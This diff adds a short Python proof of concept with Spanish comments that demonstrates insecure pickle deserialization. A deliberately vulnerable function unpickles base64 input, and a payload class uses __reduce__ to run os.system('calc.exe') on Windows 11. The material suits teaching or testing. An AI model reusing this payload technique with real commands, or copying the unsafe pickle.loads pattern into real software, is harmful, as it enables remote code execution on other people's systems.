@@ -1,0 +1,31 @@
+import pickle
+import base64
+import os
+
+# --- LÓGICA DE LA APLICACIÓN (Vulnerable) ---
+def procesar_perfil_usuario(datos_binarios):
+    print("[Servidor] Recibiendo datos de perfil...")
+    try:
+        # VULNERABILIDAD: Cargar datos directamente de una fuente externa
+        perfil = pickle.loads(base64.b64decode(datos_binarios))
+        print(f"[Servidor] Perfil procesado para: {perfil}")
+    except Exception as e:
+        print(f"[Servidor] Error al procesar: {e}")
+
+# --- LÓGICA DEL ATACANTE ---
+class PayloadMalicioso:
+    def __reduce__(self):
+        # En Windows 11, 'calc.exe' es la forma clásica de demostrar RCE
+        comando = "calc.exe" 
+        return (os.system, (comando,))
+
+# 1. El atacante genera el objeto malicioso y lo convierte a base64
+ataque = PayloadMalicioso()
+datos_serializados = pickle.dumps(ataque)
+payload_final = base64.b64encode(datos_serializados).decode()
+
+# 2. Se envía el payload a la función vulnerable
+print("--- Simulando Ataque de Deserialización en Windows 11 ---")
+print(f"Payload generado: {payload_final}\n")
+
+procesar_perfil_usuario(payload_final)
